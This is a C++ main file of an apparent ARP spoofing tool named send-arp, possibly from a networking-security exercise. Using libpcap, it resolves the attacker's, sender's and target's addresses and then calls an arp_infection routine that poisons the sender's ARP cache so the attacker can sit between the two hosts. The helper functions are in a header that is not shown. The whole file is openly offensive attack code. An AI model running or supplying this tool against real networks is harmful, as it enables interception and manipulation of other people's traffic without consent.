#include "send-arp.h"

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}

	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Ip s_ip = Ip(argv[2]);
	Ip t_ip = Ip(argv[3]);
	Ip a_ip = get_attacker_ip(dev);
	Mac a_mac = get_attacker_mac(dev);
	Mac t_mac = resolve_mac_by_arp(handle, a_mac, a_ip, t_ip, TARGET);
	Mac s_mac = resolve_mac_by_arp(handle, a_mac, a_ip, s_ip, SENDER);
	
	arp_infection(handle, s_mac, s_ip, t_ip, a_mac);
	show_info(s_ip, s_mac, t_ip, t_mac, a_ip, a_mac);
	pcap_close(handle);
}
